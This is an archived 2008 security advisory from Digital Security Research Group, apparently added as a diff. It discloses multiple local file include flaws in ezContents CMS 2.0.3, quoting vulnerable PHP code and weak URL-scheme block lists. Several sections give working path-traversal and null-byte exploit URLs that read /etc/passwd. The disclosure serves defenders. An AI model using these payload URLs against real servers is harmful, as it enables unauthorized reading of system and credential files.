@@ -1,0 +1,325 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-038
+
+
+Application:                    ezContents CMS
+Versions Affected:              2.0.3
+Application URL:                http://www.ezcontents.org/
+Vendor URL:                     http://www.visualshapers.com/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       05.08.2008
+Second report:                  18.08.2008
+Vendor Response:                NONE
+Solution:                       NONE
+Date of Public Advisory:        25.08.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+ezContents CMS has Multiple Local File Include vulnerabilities. 
+
+
+
+Details
+*******
+
+1. Local File Include vulnerability found in script /module.php
+
+Vulnerable GET parameter "link".
+
+First discovered by Zero_X [http://secunia.com/advisories/10604/].
+Vendor fixed vulnerability in version 2.0.3 by adding verification for this parameter. 
+However, attacker still can include local files.
+
+Code [line 32-42, 141-145]
+--------------------------
+#################################################
+
+$GLOBALS["rootdp"] = './';
+require_once ($GLOBALS["rootdp"]."include/config.php");
+require_once ($GLOBALS["rootdp"]."include/db.php");
+require_once ($GLOBALS["rootdp"]."include/session.php");
+include_once ($GLOBALS["rootdp"].$GLOBALS["modules_home"]."modfunctions.php");
+
+
+if ((!isset($HTTP_GET_VARS["ezSID"])) && (isset($HTTP_POST_VARS["ezSID"]))) $HTTP_GET_VARS["ezSID"] = $HTTP_POST_VARS["ezSID"];
+if ((!isset($HTTP_GET_VARS["link"])) && (isset($HTTP_POST_VARS["link"])))  $HTTP_GET_VARS["link"] = $HTTP_POST_VARS["link"];
+
+$HTTP_GET_VARS["link"] = str_replace('../', '', $HTTP_GET_VARS["link"]);
+
+...
+
+if (isExternalLink ($HTTP_GET_VARS["link"])) {
+        ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
+} else {
+        include($GLOBALS["rootdp"].$HTTP_GET_VARS["link"]);
+}
+
+#################################################
+
+isExternalLink() function in script /include/functions.php checks for remote inclusion attempts.  
+
+Code [line 768-779]
+-------------------
+#################################################
+
+function isExternalLink ($linkref)
+{
+        if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||
+                 (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||
+                 (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||
+                 (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||
+                 (substr($linkref,0,5) == 'wais:') ) {
+                 return True;
+        } else {
+                 return False;
+        }
+} // isExternalLink
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/module.php?link=....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+
+2. Local File Include vulnerabilities found in scripts
+
+/modules/diary/showdiary.php
+/modules/diary/showeventlist.php
+/modules/gallery/showgallery.php
+/modules/reviews/showreviews.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [showdiary.php, line 32-45]
+--------------------------------
+#################################################
+
+global $HTTP_SERVER_VARS;
+if ( (substr($HTTP_SERVER_VARS["PHP_SELF"],-11) == 'control.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-10) == 'module.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-16) == 'showcontents.php') ) {
+         require_once('./modules/moduleSec.php');
+} else {
+        require_once('../moduleSec.php');
+}
+
+$GLOBALS["ModuleName"] = 'diary';
+
+if (!isset($GLOBALS["gsLanguage"])) { Header("Location: ".$GLOBALS["rootdp"]."module.php?link=".$GLOBALS["modules_home"].$GLOBALS["ModuleRef"]."/showdiary.php"); }
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_admin.php");
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_main.php");
+
+#################################################
+
+Script /modules/moduleSec.php checks for inclusion attempts.
+
+Code
+----
+#################################################
+
+function moduleExternalLink ($linkref)
+{
+        if ($linkref != '') {
+                if ( (substr($linkref,0,5) == 'http:')          || (substr($linkref,0,6) == 'https:')   ||
+                         (substr($linkref,0,5) == 'file:')              || (substr($linkref,0,4) == 'ftp:')             ||
+                         (substr($linkref,0,7) == 'gopher:')    || (substr($linkref,0,7) == 'mailto:')  ||
+                         (substr($linkref,0,5) == 'news:')              || (substr($linkref,0,7) == 'telnet:')  ||
+                         (substr($linkref,0,5) == 'wais:') ) {
+                         return True;
+                } else {
+                        return False;
+                }
+        } else {
+                return False;
+        }
+} // moduleExternalLink
+
+
+if (!(isset($GLOBALS["rootdp"]))) {
+         ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
+         DIE;
+}
+if ( (moduleExternalLink($GLOBALS["rootdp"])) || (moduleExternalLink($GLOBALS["modfiledir"])) ||
+         (moduleExternalLink($GLOBALS["modules_home"])) || (moduleExternalLink($GLOBALS["admin_home"])) ||
+         (moduleExternalLink($GLOBALS["language_home"])) ) {
+         ECHO 'Remote Code Execution Patch Installed on this implementation of ezContents';
+         DIE;
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/modules/diary/showdiary.php?rootdp=DSecRG&gsLanguage=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00
+
+
+3. Local File Include vulnerabilities found in scripts
+
+/modules/diary/showdiarydetail.php
+/modules/gallery/showgallerydetails.php
+/modules/reviews/showreviewsdetails.php
+/modules/news/shownewsdetails.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [showdiarydetail.php, line 32-46]
+--------------------------------------
+#################################################
+
+global $HTTP_SERVER_VARS;
+if ( (substr($HTTP_SERVER_VARS["PHP_SELF"],-11) == 'control.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-10) == 'module.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-16) == 'showcontents.php') ) {
+         require_once('./modules/moduleSec.php');
+} else {
+        require_once('../moduleSec.php');
+}
+
+$GLOBALS["ModuleName"] = 'diary';
+
+include_once ($GLOBALS["admin_home"]."compile.php");
+
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_admin.php");
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_main.php");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&admin_home=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/modules/diary/showdiarydetail.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00
+
+
+4. Local File Include vulnerabilities found in scripts
+
+/modules/diary/submit_diary.php
+/modules/gallery/submit_gallery.php
+/modules/guestbook/submit_guestbook.php
+/modules/reviews/submit_reviews.php
+/modules/news/submit_news.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [submit_diary.php, line 32-51]
+-----------------------------------
+#################################################
+
+global $HTTP_SERVER_VARS;
+if ( (substr($HTTP_SERVER_VARS["PHP_SELF"],-11) == 'control.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-10) == 'module.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-16) == 'showcontents.php') ) {
+         require_once('./modules/moduleSec.php');
+} else {
+        require_once('../moduleSec.php');
+}
+
+// Localisation variables (used for default values)
+// Change these to suit your site preferences
+//
+$expiryperiod = 'm';                    // Time period to calculate the banner expiry date (based on today's date)
+$expirynumber = 1;
+
+
+$GLOBALS["ModuleName"] = 'diary';
+
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_admin.php");
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_main.php");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/modules/diary/submit_diary.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00
+
+
+5. Local File Include vulnerabilities found in scripts
+
+/modules/news/archivednews_summary.php
+/modules/news/news_summary.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [news_summary.php, line 32-41]
+-----------------------------------
+#################################################
+
+global $HTTP_SERVER_VARS;
+if ( (substr($HTTP_SERVER_VARS["PHP_SELF"],-11) == 'control.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-10) == 'module.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-16) == 'showcontents.php') ) {
+         require_once('./modules/moduleSec.php');
+} else {
+        require_once('../moduleSec.php');
+}
+
+include_once ($GLOBALS["admin_home"]."compile.php");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/modules/news/news_summary.php?rootdp=DSecRG&admin_home=../../../../../../../../../../../../../etc/passwd%00
+
+
+6. Local File Include vulnerabilities found in scripts
+
+/modules/diary/inlineeventlist.php
+/modules/news/inlinenews.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [inlinenews.php, line 32-52]
+---------------------------------
+#################################################
+
+global $HTTP_SERVER_VARS;
+if ( (substr($HTTP_SERVER_VARS["PHP_SELF"],-11) == 'control.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-10) == 'module.php') ||
+         (substr($HTTP_SERVER_VARS["PHP_SELF"],-16) == 'showcontents.php') ) {
+         require_once('./modules/moduleSec.php');
+} else {
+        require_once('../moduleSec.php');
+}
+
+global $EZ_SESSION_VARS;
+
+$GLOBALS["ModuleName"] = 'news';
+
+$linkref = $nLink;
+$chainlink = explode('/',$linkref);
+$modfilename = array_pop($chainlink);
+$GLOBALS["modfiledir"] = implode('/',$chainlink);
+include($GLOBALS["modfiledir"]."/moduleref.php");
+
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_admin.php");
+include_once ($GLOBALS["language_home"].$GLOBALS["gsLanguage"]."/lang_main.php");
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&nLink=../../../../../../../../../../../../../etc/passwd%00/
+http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&gsLanguage=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/modules/news/inlinenews.php?rootdp=DSecRG&language_home=../../../../../../../../../../../../../etc/passwd%00
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-08-25]
